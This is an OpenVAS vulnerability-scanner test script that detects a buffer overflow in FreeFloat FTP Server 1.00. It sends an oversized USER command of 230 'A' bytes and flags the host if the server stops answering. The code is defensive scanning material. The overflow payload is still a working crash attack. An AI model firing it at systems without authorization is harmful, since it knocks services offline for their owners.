###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freefloat_ftp_server_bof_vuln.nasl 8314 2018-01-08 08:01:01Z teissa $
#
# Freefloat FTP Server Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploits may allow remote attackers to execute
arbitrary code on the system or cause the application to crash.

Impact Level: Application";

tag_affected = "FreeFloat Ftp Server Version 1.00";

tag_insight = "The flaw is due to improper bounds checking when processing
certain requests.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Freefloat FTP Server and is prone to buffer
overflow vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801658");
  script_version("$Revision: 8314 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-08 09:01:01 +0100 (Mon, 08 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Freefloat FTP Server Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15689/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96400/freefloat-overflow.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("ftp_func.inc");

## Get FTP Port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Get Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("FreeFloat Ftp Server" >!< banner){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

get =  recv_line(socket:soc, length:100);

## Sending Attack
for(i=0;i<3;i++)
{
  attack = string("USER ",crap(data: raw_string(0x41), length: 230), "\r\n");
  send(socket:soc, data:attack);
  get = recv_line(socket:soc, length:260);

  ## Check Socket status
  if(!get)
  {
    security_message(port:ftpPort);
    exit(0);
  }
}
close(soc);
